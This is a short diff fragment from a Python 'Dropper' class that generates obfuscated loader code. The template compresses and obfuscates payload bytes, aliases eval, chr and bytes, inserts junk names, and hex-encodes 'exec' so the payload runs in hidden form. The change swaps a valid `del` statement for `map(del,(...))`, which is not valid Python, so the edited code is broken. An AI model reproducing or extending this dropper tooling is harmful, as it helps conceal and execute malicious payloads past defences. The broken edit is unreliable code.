@@ -161,8 +161,7 @@ class Dropper:
     {obfuscate_bytes(compressed, bytes_func=_bytes)},
 )
 
-del {_eval}, {_chr}, {_bytes}
-
+map(del,({_eval},{_chr,},{_bytes}))
 
 {(options := self.junk_string())}=lambda:(
     '{string_to_hex('<string>')}', '{string_to_hex('exec')}'
